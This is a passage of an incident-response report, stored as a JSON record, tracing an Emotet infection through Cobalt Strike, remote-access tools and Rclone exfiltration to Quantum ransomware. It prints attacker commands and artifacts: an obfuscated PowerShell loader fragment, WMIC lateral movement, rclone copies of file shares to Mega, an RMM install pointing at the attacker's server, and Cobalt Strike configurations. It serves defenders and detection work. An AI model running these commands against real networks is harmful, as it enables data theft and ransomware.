{
    "id": "d87668d5-0110-4af2-8568-b53dc964bf72",
    "created_at": "2023-01-12T15:03:54.14732Z",
    "updated_at": "2025-03-27T02:16:53.055015Z",
    "deleted_at": null,
    "sha1_hash": "f8c4fb5baa3c2aa3f886fc3787f1dd71c36cd1dc",
    "title": "2022-11-28 - Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware",
    "authors": "",
    "file_creation_date": "2022-12-29T00:17:15Z",
    "file_modification_date": "2022-12-29T00:17:15Z",
    "file_size": 2664071,
    "plain_text": "# Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware\n\n**[thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/](https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/)**\n\nNovember 28, 2022\n\nIn June of 2022, we observed a threat actor gaining access to an environment via Emotet\nand operating over a eight day period. During this time period, multiple rounds of\nenumeration and lateral movement occurred using Cobalt Strike. Remote access tools were\n[used for command and control, such as Tactical RMM and](https://github.com/amidaware/tacticalrmm) [Anydesk. The threat actors final](https://anydesk.com/en)\nactions included data exfiltration using Rclone and domain wide deployment of Quantum\nRansomware.\n\n[We have observed similar traits in previous cases where Emotet and Quantum were seen.](https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/)\n\n## Case Summary\n\nThe intrusion began when a user double clicked a LNK file, which then executed encoded\nPowershell commands to download an Emotet DLL onto the computer. Once executed,\nEmotet setup a Registry Run Key to maintain persistence on the beachhead host.\n\nEmotet, then proceeded to execute a short list of discover commands using the Windows\nutilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers. These\ncommands would go on to be repeated daily by the Emotet process. Around one and onehalf hours after execution, Emotet began sending spam emails, mailing new malicious\nattachments to continue spreading.\n\nSimilar activity continued over the second day, but on the third day of the incident, Emotet\ndropped a Cobalt Strike executable beacon onto the beachhead host. Using the Cobalt\nStrike beacon, the threat actors began conducting a new round of discovery activity.\nWindows net commands were run, targeting domain groups and computers, nltest was\nexecuted again, and they also used tasklist and ping to investigate a remote host.\n\nThe threat actor then moved laterally to a workstation. They first attempted this action using\na PowerShell beacon and a remote service on the host, but while the script did execute on\nthe remote host, it appeared to fail to connect to the command and control server. Next, they\nproceeded to transfer a beacon executable over SMB to the remote host’s ProgramData\ndirectory. This beacon was then successfully executed via WMI and connected successfully\nto the threat actors server.\n\n\n-----\n\nOnce on this new host the threat actors proceeded to run the net commands to review the\nDomain Administrators group again. They then proceeded to dump credentials from the\nLSASS process on the host. With some further process injection they then began to\nenumerate SMB shares across the environment and on finding a primary file server reviewed\nseveral documents present on the server. This Cobalt Strike server stopped communicating\nshortly there after.\n\nOn the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon. Again, some\nnet command discovery was run for domain admins and domain controller servers. A flight of\nnetlogon authentications were observed from the beachhead host to the domain controller as\na possible attempt at exploiting the domain controller.\n\nThe threat actors, however, proceeded along a more traditional path, using SMB file\ntransfers and remote services to move laterally across domain controllers and several other\nservers in the environment using Cobalt Strike beacon DLL’s. On the domain controller, the\nthreat actors conducted further discovery tasks running find.bat and p.bat, which executed\nAdFind active directory discovery and performed a ping sweep across the environment.\n\nOn one of the other targeted servers, the threat actors deployed Tactical RMM, a remote\nmanagement agent, for additional access and persistence in the environment. From this\nserver, the threat actors were observed using Rclone to exfiltrate data from a file share\n[server in the environment. The Mega.io service was the location the stolen data was sent.](http://mega.io/)\n\nOn the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some\ndata from the mail server again using Rclone but this appeared to fail and the threat actors\ndid not try to resolve the issue. After this the threat actors went silent until the eighth and final\nday of the intrusion.\n\nOn the eighth day of the intrusion the threat actor accessed the environment using Tactical\nRMM to deploy Anydesk on the compromised host. After establishing a connection using\n[Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify](https://www.softperfect.com/products/networkscanner/)\nhosts across the environment.\n\nFrom there, the threat actors began connecting to other hosts via RDP, including the a\nbackup server. After choosing a new server and connecting via RDP, the threat actors\ndropped Powertool64.exe and dontsleep.exe in preparation for their final actions. Finally,\n```\nlocker.dll and a batch file 1.bat were dropped on the host and the batch file was executed\n\n```\nbeginning the Quantum rasomware deployment to all hosts over SMB. From initial intrusion\nto ransomware deployment, 154 hours passed, over eight days.\n\nAfter ransomware deployment, the threat actors remained connected and did RDP to a few\nother servers and executed ProcessHacker.exe and a net command. With no other activity\ntaking place, we assess that this was likely the threat actors confirming successful\ndeployment of the ransomware payload across the network\n\n\n-----\n\n## Services\n\n[We offer multiple services including a Threat Feed service which tracks Command and](https://thedfirreport.com/services/)\nControl frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire,\n[PoshC2, etc. More information on this service and others can be found here.](https://thedfirreport.com/services/)\n\nBoth of the Cobalt Strike servers in this case were on our Threat Feed (days to months) in\nadvance of this intrusion.\n\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures,\nfiles, event logs including Sysmon, Kape packages, and more, under our Security\nResearcher and Organization services.\n\n## Timeline\n\n\n-----\n\n-----\n\n[Report Lead: @iiamaleks](https://twitter.com/iiamaleks)\n\n[Analysis and reporting: @samaritan_o, and](https://twitter.com/samaritan_o) [@yatinwad](https://twitter.com/yatinwad)\n\n## Initial Access\n\nInitial access took the form of an LNK file delivered to a victim through a MalSpam campaign.\n\n\n-----\n\nThe Powershell script embedded within the LNK is a Base64 encoded script with various\ncomponents split into different variables for obfuscation purposes. The script will decode\nitself rather than depend on Powershell’s built-in ability to execute encoded scripts.\n\n\n-----\n\n```\n..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe c &\n{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='uYnI\n\nVsLWVuZXJnaWFraS5nci93cC1pbmNsdWRlcy9JZHJWS09HWU1Rb2R1N0lsT0loLyIsImh0dHA6Ly9kcmVjaHNs\n\nvIiwiaHR0cDovL2RpbHNybC5jb20vcGhvbmUvcGZpcDVtLyIpOyR0PSJuZldGUSI7JGQ9IiRlbnY6VE1QXC4uX\n\nZjtSZWdzdnIzMi5leGUgIiRkXGp4S1BJck1GeEouT09mIjticmVha30gY2F0Y2ggeyB9fQ==';$KOKN='ICBXc\n\nKN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($GBUus));$G\n\n```\nThe Powershell script, when double clicked (executed), will attempt to connect to a set of\ndomains containing the Emotet malware. Upon successful download of the Emotet malware,\nthe PowerShell script will write it to a temporary directory and execute the payload via\n```\nregsvr32.exe.\n\n```\nIt is interesting to note, the LNK identifies the machine it was created on through the\nNetBIOS name of black-dog and a MAC Address beginning with 08:00:27 indicating a\n[system running on Virtualbox.](https://macaddress.io/faq/how-to-recognise-an-oracle-virtual-machine-by-its-mac-address)\n```\nMachine ID: black-dog\n\nMAC Address: 08:00:27:c6:74:5d\n\nMAC Vendor: PCS SYSTEMTECHNIK\n\nCreation: 2022-05-12 15:33:49\n\n```\n\n-----\n\n## Execution\n\nOnce the PowerShell script from the LNK file executed successfully, Emotet began\nexecution. Emotet will initially copy itself to a randomly named folder in the users temporary\nfolder.\n\nMultiple instances of Emotet spawning itself was observed over a period of three days.\nAlmost all the instances of Emotet included three enumeration commands executed:\n```\nsysteminfo\n\nipconfig /all\n\nnltest /dclist:\n\n```\nTowards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE\nexecutable and executed. This access was used to perform enumeration and move laterally\nto other hosts.\n\nThe following diagram aims to provide an illustration of the execution chain with multiple\ninstances of Emotet leading to Cobalt Strike.\n\n\n-----\n\n## Persistence\n\nThe Emotet malware has used various persistence methods over time, an example can be\n[seen here.](https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/)\n\nOn the first day, Emotet established persistence via a run key.\n\nAs we can see, the regsvr32.exe Windows’s native utility was used to launch the Emotet\nDLL.\n\n\n-----\n\nAfter moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to\n[deploy several remote management tools across the environment. Tactical RMM was the](https://docs.tacticalrmm.com/)\nfirst tool chosen for deployment. Tactical RMM is a remote management software platform\nthat uses a combination of agents to allow for remote management and access to systems.\n\nThe file 17jun.exe, was deployed into the programdata folder on one of the servers. This\nwas then executed by the threat actors and resulted in the installation of the main RMM\nagent. The install completed with the following command.\n```\n\"C:\\Program Files\\TacticalAgent\\tacticalrmm.exe\" -m install --api\nhttps://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth\n5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c\n\n```\nA service was also created for the agent.\n\n\n-----\n\n```\nEvent 7045\nA service was installed in the system.\nService Name: TacticalRMM Agent Service\nService File Name: \"C:\\Program Files\\TacticalAgent\\tacticalrmm.exe\" -m svc\nService Type: user mode service\nService Start Type: auto start\nService Account: LocalSystem\n\n```\nAlong with the tacticalrmm.exe client, a second executable called meshagent.exe, was\ninstalled to handle remote session interaction, and a separate service was created for that\nagent.\n```\nEvent 7045\nA service was installed in the system.\nService Name: Mesh Agent\nService File Name: \"C:\\Program Files\\Mesh Agent\\MeshAgent.exe\"\nService Type: user mode service\nService Start Type: auto start\nService Account: LocalSystem\n\n```\nOn the final day of the intrusion, the threat actors added AnyDesk to the same server running\nTactical RMM, providing an additional means of access prior to the deployment of\nransomware\n\n\n-----\n\n```\nEvent 7045\nA service was installed in the system.\nService Name: AnyDesk Service\nService File Name: \"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --service\nService Type: user mode service\nService Start Type: auto start\nService Account: LocalSystem\n\n## Privilege Escalation\n\n```\nWe suspect a failed ZeroLogon exploit was attempted against a domain controller,\noriginating from the beachhead host with Cobalt Strike running on it. One indicator is the\n‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon\nimplementation.\n\n\n-----\n\nDuring a period of a few seconds, multiple NetrServerReqChallenge and\nNetrServerAuthenticate2 methods in the traffic from a single source were observed, this is\n[one of the indicators of a Zerologon attempt.](https://bi-zone.medium.com/hunting-for-zerologon-f65c61586382)\n\n## Defense Evasion\n\n### Process Injection\n\nThe threat actor was observed process injecting into legitimate process and using them to\nexecute their own tasks on the system, this can be seen from Winlogon connecting to a\ndomain associated with a Cobalt Strike server and removing files from the system.\n\nThe specific mechanism used to inject into a foreign process, was injecting arbitrary code\ninto its memory space, and executing it as a remotely created thread. This occurred from\nrundll32.exe, which was previously used to execute and run Cobalt Strike.\n\nThe following table summarizes the processes used for injection during this case:\n\n**Injected Process Name** **Injection Payload**\n\nC:\\Windows\\system32\\winlogon.exe Cobalt Strike\n\nC:\\Windows\\System32\\RuntimeBroker.exe Cobalt Strike\n\n\n-----\n\nC:\\Windows\\System32\\svchost.exe Cobalt Strike\n\nC:\\Windows\\System32\\taskhostw.exe Cobalt Strike\n\nC:\\Windows\\system32\\dllhost.exe Cobalt Strike\n\n### PowerTool\n\nPowerTool was observed, dropped and executed on the server used to deploy the\nransomware payload. This tool has the ability to kill a process, delete its process file, unload\ndrivers, and delete the driver files. It has been reportedly used by several ransomware\n[groups to aid in their operations [1][2][3][4].](https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html)\n\nAs a byproduct of execution, PowerTool will drop a driver to disk and load it into the system.\n```\nDriver Signature Name: 北京华林保软件技术有限公司\n\n### Indicator Removal\n\n```\nThe threat actor was observed deleting files that had been dropped to disk.\n\n## Credential Access\n\nProcess access to LSASS was observed, likely to dump credentials from a process that was\ninjected with Cobalt Strike. The Granted Access level matches know indicators for Mimikatz\n[with an access value of 0x1010 (4112), as we covered in a prior report.](https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/)\n\nWe also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS,\nas well indicating other credential access tools may have been in use by the threat actor.\n\n\n-----\n\n## Discovery\n\nDuring the initial Emotet execution, three automated discovery commands were observed.\nThese were then repeated, seen occurring once a day from the Emotet host.\n```\nsysteminfo\n\nipconfig /all\n\nnltest /dclist:\n\n```\nMultiple commands responsible for enumerating Active Directory groups, domain joined\ncomputers, and domain trusts, were executed via Cobalt Strike on the beachhead.\n```\nwhoami /groups\n\nnet group /domain\n\nnet group \"domain computers\" /domain\n\nnet group /domain \"Domain controllers\"\n\nnet group \"domain admins\" /domain\n\nnltest /trusted_domains\n\n```\nThe threat actor was observed querying a non-existent group Domain controller, followed\nby a command correcting the mistake that queried the group Domain controllers .\n```\nnet group /domain \"Domain controller\"\n\nnet group /domain \"Domain controllers\"\n\n```\nA ping command issued to a user workstation and a domain controller were observed\nmoments before lateral movement was attempted.\n```\nping COMPUTER.REDACTED.local\nInvoke-ShareFinder was observed being used via Powershell in the environment from an\n\n```\ninjected process with Cobalt Strike:\n\nIn addition to the Invoke-ShareFinder command, other functions that were used by the\nscript were also observed.\n\nThe remnants of Invoke-ShareFinder could also be seen on the network through the\nconsistent querying of “ADMIN$” and “C$” shares for each host over a short period of time.\nIn addition to these shares, a few shares from the file servers were also accessed.\n\n\n-----\n\nOnce on the domain controller, two batch files were run. The first find.bat was used to run\nAdFind.exe for Active Directory discovery.\n```\nfind.exe -f \"objectcategory=computer\"\n\nfind.exe -f \"(objectcategory=organizationalUnit)\"\n\nfind.exe -subnets -f (objectCategory=subnet)\n\nfind.exe -f \"(objectcategory=group)\"\n\nfind.exe -gcb -sc trustdmp\n\n```\nThe second script, p.bat, was run to sweep the network using ping, looking for network\nconnectivity and online hosts.\n\n\n-----\n\nOn the final day, prior to ransom deployment, the threat actor also dropped netscan.exe on\nthe server, and executed it from the Tactical RMM meshagent.exe session.\n```\nC:\\Windows\\System32\\mstsc mstsc.exe /v:IP_ADDRESS_1\n\nC:\\Windows\\System32\\mstsc mstsc.exe /v:IP_ADDRESS_2\n\nC:\\Windows\\SysWOW64\\explorer.exe \"C:\\Windows\\SysWOW64\\explorer.exe\" \\\\IP_ADDRESS_1\\C$\n\nC:\\Windows\\SysWOW64\\explorer.exe \"C:\\Windows\\SysWOW64\\explorer.exe\" \\\\IP_ADDRESS_2\\C$\n\n## Lateral Movement\n\n```\n**Cobalt Strike Remote Service Creation**\n\nThe threat actor was observed creating remote services in order to execute beacon DLL files\ntransferred via SMB as SYSTEM on remote hosts.\n\n\n-----\n\n```\nC:\\Windows\\System32\\cmd.exe /c rundll32.exe C:\\ProgramData\\x86.dll, StartA\n\n```\n**WMI**\n\nIn another instance, an executable Cobalt Strike beacon was copied via SMB to a target\nmachine, and then executed via WMI.\n```\nwmic /node:IP_Address process call create \"cmd.exe /c start\nC:\\Progradata\\sc_https_x64.exe\"\n\n```\n**Remote Desktop**\n\nLastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple\ncompromised hosts utilized for lateral movement on the final day of the intrusion and during\nthe ransomware deployment.\n\n## Collection\n\nOn the third day of the intrusion, after moving laterally, the threat actors began to review\nsensitive documents stored on network shares, including revenue, insurance, and password\nstorage documents.\n\n\n-----\n\nThese documents were again reviewed by the threat actor on the final day of the intrusion.\nLater the threat actor viewed the stolen files off network, observed by triggered canary\ntokens, which revealed connections from an AWS EC2 instance.\n\n## Command and Control\n\n**Emotet**\n\nThe Emotet loader pulled the main second stage payload from the following domains:\n```\nhxxps://descontador[.]com[.]br\n\nhxxps://www.elaboro[.]pl\n\nhxxps://el-energiaki[.]gr\n\nhxxp://drechslerstammtisch[.]de\n\nhxxp://dhnconstrucciones[.]com[.]ar\n\nhxxp://dilsrl[.]com\n\n```\nThe second stage loader had multiple IP addresses in its configuration to attempt\nconnections to:\n\n\n-----\n\n```\n103.159.224.46\n\n103.75.201.2\n\n119.193.124.41\n\n128.199.225.17\n\n131.100.24.231\n\n139.59.60.88\n\n144.217.88.125\n\n146.59.226.45\n\n149.56.131.28\n\n159.89.202.34\n\n165.22.211.113\n\n165.227.166.238\n\n178.128.82.218\n\n209.126.98.206\n\n213.32.75.32\n\n37.187.115.122\n\n45.226.53.34\n\n45.55.134.126\n\n46.55.222.11\n\n51.210.176.76\n\n51.254.140.238\n\n54.37.70.105\n\n82.223.82.69\n\n91.207.181.106\n\n92.114.18.20\n\n94.23.45.86\n\n96.125.171.16\n\n```\n**Cobalt Strike**\n\nThe following Cobalt Strike C2 servers were observed being used. Both HTTP and HTTPS\nwere observed to be used.\n```\n139.60.161.167 (survefuz[.]com)\n\n139.60.160.18 (juanjik[.]com)\n139.60.161.167 (survefuz[.]com)\n\nJA3s: 211897664d51cffdfd7f78d684602ecc\n\nJA3: a0e9f5d64349fb13191bc781f81f42e1\n\nCertificate: 03:4e:01:cb:d0:d4:40:24:ad:e0:cd:81:9f:00:44:0f:1e:de\n\nNot Before: May 24 11:25:15 2022 GMT\n\nNot After: Aug 22 11:25:14 2022 GMT\n\nIssuer Org: Let's Encrypt\n\nSubject Common: survefuz[.]com\n\nPublic Algorithm: id-ecPublicKey\n\n```\n\n-----\n\n```\n139.60.160.18 (juanjik[.]com)\n\nJA3s: 211897664d51cffdfd7f78d684602ecc\n\nJA3: a0e9f5d64349fb13191bc781f81f42e1\n\nCertificate: 04:ea:aa:59:1e:c6:50:6e:d3:70:d4:24:50:f0:a5:30:9a:e6\n\nNot Before: Jun 14 17:38:08 2022 GMT\n\nNot After: Sep 12 17:38:07 2022 GMT\n\nIssuer Org: Let's Encrypt\n\nSubject Common: juanjik[.]com\n\nPublic Algorithm: rsaEncryption\n\n```\nThe following are the Cobalt Strike configurations observed:\n\n\n-----\n\n```\n139.60.161.167 (survefuz[.]com)\n\n{\n\n \"beacontype\": [\n\n  \"HTTP\"\n\n ],\n\n \"sleeptime\": 45000,\n\n \"jitter\": 37,\n\n \"maxgetsize\": 1403644,\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n \"license_id\": 206546002,\n\n \"cfg_caution\": false,\n\n \"kill_date\": null,\n\n \"server\": {\n\n  \"hostname\": \"survefuz[.]com\",\n\n  \"port\": 80,\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqoyVkBHx713LeUHmw7FAozt15LWTMgX1nCLSXECllryUTD\n },\n\n \"host_header\": \"\",\n\n \"useragent_header\": null,\n\n \"http-get\": {\n\n  \"uri\": \"/jquery-3.3.1.min.js\",\n\n  \"verb\": \"GET\",\n\n  \"client\": {\n\n   \"headers\": null,\n\n   \"metadata\": null\n\n  },\n\n  \"server\": {\n\n   \"output\": [\n\n    \"print\",\n\n    \"append 1522 characters\",\n\n    \"prepend 84 characters\",\n\n    \"prepend 3931 characters\",\n\n    \"base64url\",\n\n    \"mask\"\n\n   ]\n\n  }\n\n },\n\n \"http-post\": {\n\n  \"uri\": \"/jquery-3.3.2.min.js\",\n\n  \"verb\": \"POST\",\n\n  \"client\": {\n\n   \"headers\": null,\n\n   \"id\": null,\n\n   \"output\": null\n\n  }\n\n },\n\n \"tcp_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n```\n\n-----\n\n```\n crypto_scheme : 0,\n\n \"proxy\": {\n\n  \"type\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"behavior\": \"Use IE settings\"\n\n },\n\n \"http_post_chunk\": 0,\n\n \"uses_cookies\": true,\n\n \"post-ex\": {\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\"\n\n },\n\n \"process-inject\": {\n\n  \"allocator\": \"NtMapViewOfSection\",\n\n  \"execute\": [\n\n   \"CreateThread 'ntdll!RtlUserThreadStart'\",\n\n   \"CreateThread\",\n\n   \"NtQueueApcThread-s\",\n\n   \"CreateRemoteThread\",\n\n   \"RtlCreateUserThread\"\n\n  ],\n\n  \"min_alloc\": 17500,\n\n  \"startrwx\": false,\n\n  \"stub\": \"yl5rgAigihmtjA5iEHURzg==\",\n\n  \"transform-x86\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"transform-x64\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"userwx\": false\n\n },\n\n \"dns-beacon\": {\n\n  \"dns_idle\": null,\n\n  \"dns_sleep\": null,\n\n  \"maxdns\": null,\n\n  \"beacon\": null,\n\n  \"get_A\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_TXT\": null,\n\n  \"put_metadata\": null,\n\n  \"put_output\": null\n\n },\n\n \"pipename\": null,\n\n \"smb_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"stage\": {\n\n  \"cleanup\": true\n\n },\n\n \"ssh\": {\n\n```\n\n-----\n\n```\n  hostname : null,\n\n  \"port\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"privatekey\": null\n\n }\n\n}\n\n```\n\n-----\n\n```\n139.60.160.18:80 (juanjik[.]com)\n\n\n{\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n \"dns_beacon\": {},\n\n \"smb_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": true\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"yl5rgAigihmtjA5iEHURzg==\",\n\n  \"transform_x64\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"transform_x86\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"startrwx\": false,\n\n  \"min_alloc\": \"17500\",\n\n  \"userwx\": false,\n\n  \"execute\": [\n\n   \"CreateThread 'ntdll!RtlUserThreadStart'\",\n\n   \"CreateThread\",\n\n   \"NtQueueApcThread-s\",\n\n   \"CreateRemoteThread\",\n\n   \"RtlCreateUserThread\"\n\n  ],\n\n  \"allocator\": \"NtMapViewOfSection\"\n\n },\n\n \"uses_cookies\": true,\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {},\n\n \"maxgetsize\": \"1403644\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\"\n\n },\n\n \"tcp_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCs\n\n  \"port\": \"443\",\n\n  \"hostname\": \"juanjik[.]com\"\n\n```\n\n-----\n\n```\n },\n\n \"beacontype\": [\n\n  \"HTTPS\"\n\n ],\n\n \"license_id\": \"206546002\",\n\n \"jitter\": \"37\",\n\n \"sleeptime\": \"45000\",\n\n \"http_get\": {\n\n  \"server\": {\n\n   \"output\": [\n\n    \"print\",\n\n    \"append 1522 characters\",\n\n    \"prepend 84 characters\",\n\n    \"prepend 3931 characters\",\n\n    \"base64url\",\n\n    \"mask\"\n\n   ]\n\n  },\n\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/jquery-3.3.1.min.js\"\n\n },\n\n \"cfg_caution\": false,\n\n \"host_header\": \"\",\n\n \"crypto_scheme\": \"0\",\n\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/jquery-3.3.2.min.js\"\n\n }\n\n}\n\n```\n\n-----\n\n```\n139.60.160.18:443 (juanjik[.]com)\n\n\n{\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n \"dns_beacon\": {},\n\n \"smb_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": true\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"yl5rgAigihmtjA5iEHURzg==\",\n\n  \"transform_x64\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"transform_x86\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"startrwx\": false,\n\n  \"min_alloc\": \"17500\",\n\n  \"userwx\": false,\n\n  \"execute\": [\n\n   \"CreateThread 'ntdll!RtlUserThreadStart'\",\n\n   \"CreateThread\",\n\n   \"NtQueueApcThread-s\",\n\n   \"CreateRemoteThread\",\n\n   \"RtlCreateUserThread\"\n\n  ],\n\n  \"allocator\": \"NtMapViewOfSection\"\n\n },\n\n \"uses_cookies\": true,\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {},\n\n \"maxgetsize\": \"1403644\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\"\n\n },\n\n \"tcp_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCs\n  \"port\": \"80\",\n\n  \"hostname\": \"juanjik[.]com\"\n\n```\n\n-----\n\n```\n },\n\n \"beacontype\": [\n\n  \"HTTP\"\n\n ],\n\n \"license_id\": \"206546002\",\n\n \"jitter\": \"37\",\n\n \"sleeptime\": \"45000\",\n\n \"http_get\": {\n\n  \"server\": {\n\n   \"output\": [\n\n    \"print\",\n\n    \"append 1522 characters\",\n\n    \"prepend 84 characters\",\n\n    \"prepend 3931 characters\",\n\n    \"base64url\",\n\n    \"mask\"\n\n   ]\n\n  },\n\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/jquery-3.3.1.min.js\"\n\n },\n\n \"cfg_caution\": false,\n\n \"host_header\": \"\",\n\n \"crypto_scheme\": \"0\",\n\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/jquery-3.3.2.min.js\"\n\n }\n\n}\n\n```\n**Tactical RMM Agent**\n\nThe threat actor dropped a Tactical RMM Agent on one of the servers as an alternative\ncommand and control avenue to access the network. During the installation of the software,\nthe following command was observed:\n```\n\"C:\\Program Files\\TacticalAgent\\tacticalrmm.exe\" -m install --api\nhttps://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth\nREDACTED\n\n```\n\n-----\n\nThis command reveals the floppasoftware.com domain used by the threat actor for the\nremote management of Tactical RMM Agent. This domain was registered very close to the\ntimeline of this incident.\n\nA domain registered to be used with Tactical RMM Agent will have both an api and mesh\nsubdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com.\nThese were both hosted on the same server IP: 212.73.150.62.\n\nIn addition, during the execution of Tactical RMM Agent, the software will reach out to a\ncentralized domain in order to retrieve the current public IP address in use:\n```\nicanhazip.tacticalrmm.io\n\n### AnyDesk\n\n```\nOn the final day of the intrusion, AnyDesk was deployed on the server they had previously\ninstalled Tactical RMM on. Using this RMM agent they proceeded to install AnyDesk on the\nhost. The following process activity was observed from meshagent.exe.\n```\nMeshAgent.exe -kvm1\n\n- Initiating Process File Name, column 6, row 12\n\n\"MeshAgent.exe\" -b64exec\ncmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KC\n\n```\nThe decoded base 64 content reveals commands for console access and connect actions.\n\nThis is then followed by the following process flow:\n\n\n-----\n\nOnce downloaded and installed, the threat actor initiated a connection to the AnyDesk host.\n```\nClient-ID: 752733537 (FPR: 27ac27e2c9ed)\n\nLogged in from 84.17.49.114:1249\n\n## Exfiltration\n\n```\n[Also seen in our last report on Emotet, threat actors leveraged Rclone to exfiltrate data to](https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/)\n[Mega (Mega.nz) storage services.](http://mega.nz/)\n\n\n-----\n\n```\nrclone.exe copy \"\\\\SERVER.domain.name\\path\" mega:1 -q --ignore-existing --autoconfirm --multi-thread-streams 6 --transfers 6\n\nrclone.exe copy \"\\\\SERVER.domain.name\\path\" mega:2 -q --ignore-existing --autoconfirm --multi-thread-streams 6 --transfers 6\n\n```\nFrom the rclone.conf file, the threat actors left the details of the remote account being used.\n```\n[email protected]\n\n```\nWith the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out\nof the environment.\n\n## Impact\n\n### Spam 